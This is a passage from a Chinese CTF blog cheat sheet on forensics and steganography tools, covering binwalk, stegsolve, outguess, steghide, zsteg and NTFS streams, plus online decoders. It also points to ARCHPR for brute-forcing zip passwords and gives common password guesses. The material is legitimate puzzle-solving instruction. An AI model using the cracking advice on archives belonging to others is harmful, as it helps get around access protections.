(jpg)，文件头：FFD8FFE1<br>&lt;.img<br>src&#x3D;”data:image…….”<br>alt&#x3D;”Base64 encoded image” &#x2F;&gt; 生成图片（常用于base64隐写图片）</p></blockquote><p>查看图片基本信息，kali下输入:</p><blockquote><p>exiftool 1.jpg</p></blockquote><p>当需要文件分离时，需要在Kali下文件分离</p><p><strong>binwalk</strong>文件分离</p><blockquote><p>binwalk -e +文件名 ||binwalk +文件名</p></blockquote><p><strong>foremost</strong>文件分离</p><blockquote><p>foremost -i +文件名</p></blockquote><p><strong>dd</strong> 文件分离 </p><p>dd命令作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。</p><blockquote><p>dd if&#x3D;原文件名 of&#x3D;(要分解的文件名) skip&#x3D;5016064(十进制值) bs&#x3D;1</p></blockquote></li></ul><p>​     <img src="http://tvax4.sinaimg.cn/large/007u0ID7gy1h60h1fjsvgj30tm0eudgp.jpg" alt="1662714741963_副本"></p><p>(binwalk和foremost使用示例)</p><p> 当遇到图片隐写题时，可以使用<strong>Stegsolve</strong>工具（可用于逐帧分析GIF图片，lsb隐写等）</p><p>​      使用方法如下：</p><blockquote><p>File Format:文件格式</p><p>Data Extract:数据提取</p><p>Steregram Solve:立体试图 可以左右控制偏移</p><p>Frame Browser:帧浏览器</p><p>Image Combiner:拼图，图片拼接</p></blockquote><p>  <img src="http://tva3.sinaimg.cn/large/007u0ID7gy1h60guabx4xj30sd0kaqfa.jpg" alt="1662714463482"></p><p>( stegsolve使用示例)</p><p> <strong>stegdetect</strong> 查询jpg图片经过哪种隐写 将图片复制到     stegdetect.exe所在目录下右键PowerShell命令</p><blockquote><p>.\stegdetect.exe -tjopi -s 10.0 .\hide.jpg</p></blockquote><p>   检测该图片用的是哪种加密方式.</p><p><strong>F5图片隐写</strong> Kali工具  点开F5-steganography文件夹 在控制端导入 输入java Extract 图片</p><p><strong>图片高宽</strong>的修改</p><p><strong>tweakpng.exe</strong>打开图片提示IDHRcyc错误，表示文件尺寸被修改，且未修改crc值</p><p><strong>outguess</strong>(关键词 猜)  </p><blockquote><p>无加密:outguess -r &#x2F;root&#x2F;angrybird.jpg -t 11.txt<br>     解密 outguess -k “my secret key” -r out.jpg hidden.txt</p></blockquote><p><strong>steghide隐写</strong> (图片或音频) Kali命令</p><blockquote><p>steghide extract -sf 文件(密码一般为空或者文件名)</p></blockquote><p><strong>题目提示NTFS</strong>  是在txt中隐藏了txt文件 cmd 输入</p><blockquote><p>notepad <em>.txt:</em>.txt</p></blockquote><p>IDAT模块很多时 用<strong>tweakpng</strong>修改 Kali中用</p><blockquote><p>pngcheck -vv 查看</p></blockquote><p><strong>JPHS隐写</strong>:(txt藏在JPG里) 打开需要提取隐藏信息的图片h.jpg 点seek输入对应密码（大多为123456）</p><p><strong>zsteg</strong>可以检测PNG和BMP图片里的隐写数据。</p><p>zsteg支持检测：<br>1：LSB steganography in PNG &amp; BMP<br>2：zlib-compressed data<br>3：OpenStego<br>4：Camouflage 1.2.1<br>5：LSB with The Eratosthenes set</p><blockquote><p>zsteg -E “extradata:0” xxxx.png &gt; flag</p></blockquote><p><img src="http://tva1.sinaimg.cn/large/007u0ID7gy1h60h5nhzkbj30eh05n0vt.jpg" alt="1662715206840"></p><p>(zsteg使用示例)</p><p><strong>SilentEye</strong> 可以轻松地使用隐写术，将消息隐藏到图片或声音中。它提供了一个很好的界面，并通过使用插件系统轻松集成了新的隐写算法和加密过程。</p><p><img src="http://tvax2.sinaimg.cn/large/007u0ID7gy1h60he36v0ej30o90ei7cr.jpg" alt="1662715680393"></p><p><strong>WaterMake</strong>盲水印工具：该工具提供了文字水印、图片水印和隐形水印三种水印效果，用于图片隐写题，提示blind等关键字时可能会使用。</p><p><img src="http://tvax4.sinaimg.cn/large/007u0ID7gy1h60hnc5i0nj30rr0kpk0o.jpg" alt="1662716181338"></p><p><strong>ARCHPR</strong>压缩包密码解压工具：支持多种密码方式，有<strong>暴力、掩码、字典、明文、担保winzip恢复、口令来自密匙</strong>等类型，一般用来爆破压缩包密码。</p><p><img src="http://tva4.sinaimg.cn/large/007u0ID7gy1h60hv80ojwj30g90ft0xf.jpg" alt="1662716675522"></p><p>**MP3stego(**音频隐写)详细看</p><p><a href="https://blog.csdn.net/myloveprogrmming/article/details/52641916">https://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p><p><strong>Audacity</strong> 音频查看工具</p><p>针对音频题目的常用工具，具体使用教程见</p><p><a href="http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml">http://www.360doc.com/content/13/0620/17/1437142_294320939.shtml</a></p><p>最后，还有一些<strong>在线MISC解题常用网站</strong>：</p><p>各种在线工具大全：<a href="https://readflag.cn/">https://readflag.cn/</a></p><p>Brainfuck在线工具： <a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a>       <a href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a></p><p>蛇形解码：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p><p>emoji解密：<a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a>     <a href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p><p>中文电码查询：<a href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></p><p>0宽字符隐写：<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>G语言  &#x2F;&#x2F; GCode Viewer and Machine Simulator：<a href="https://ncviewer.com/">https://ncviewer.com/</a></p><p>RGB颜色数值转换：<a href="https://www.qtool.net/colorsize">https://www.qtool.net/colorsize</a></p><p>Unix时间戳：<a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
